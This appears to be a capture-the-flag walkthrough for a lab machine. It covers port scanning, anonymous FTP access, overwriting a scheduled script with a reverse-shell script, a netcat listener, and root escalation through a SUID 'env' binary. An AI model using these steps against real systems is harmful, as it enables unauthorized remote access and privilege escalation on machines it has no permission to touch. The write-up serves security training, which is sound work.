Enumeration

In first place we’re doing a ping to check if the machine is running and to know the OS.

ping -c 1 10.10.113.231

Once we know that the machine is active, it’s time to scan the ports and see the services that are running.

sudo nmap -p- -sCV 10.10.113.231 -n -Pn --min-rate 5000 -oN Scan

Anonymous FTP

Nmap has detected anonymous login in the FTP server so let’s check what’s there.

ftp 10.10.113.231

To enter with an anonymous session in FTP, we should provide the user anonymous and a blank password.

To list the FTP server content, we can use dir and ls.

In scripts there are some files, a “log file”, a to do file and a bash script.

The script checks if is something in the /tmp folder and the server should be executing it every x time. In order to try that we can modify the script and upload it again in replacing the actual script.

This “special” script does a TCP connection using built-in linux sockets.Just in case, we prepare a netcat listener.

nc -lvnp 443

Now that’s all ready, we enter the server and upload the “special” script replacing the original with put.

ftp 10.10.113.231
cd scripts 
put clean.sh

And we’got the reverse shell.

Privilege escalation

Once we’re in, we have to adapt the shell to be able to switch the user and use some specific commands.

script /dev/null -c bash
export TERM=xterm
export SHELL=bash

After gaining an adapted shell, one of the most common ways to escalate privileges are the SUID binaries. In order to do that, i’m gonna use find.

find / -perm -4000 2>/dev/null

Here we are looking for a binary that is weird to see with suid, in this case is env.

In GTFOBins we can find how to exploit it.

To exploit this SUID binary, we’re using the command above but removing the dot and the slash.

env /bin/sh -p

If we exec a whoami we’re gonna see that we’re the root user now.
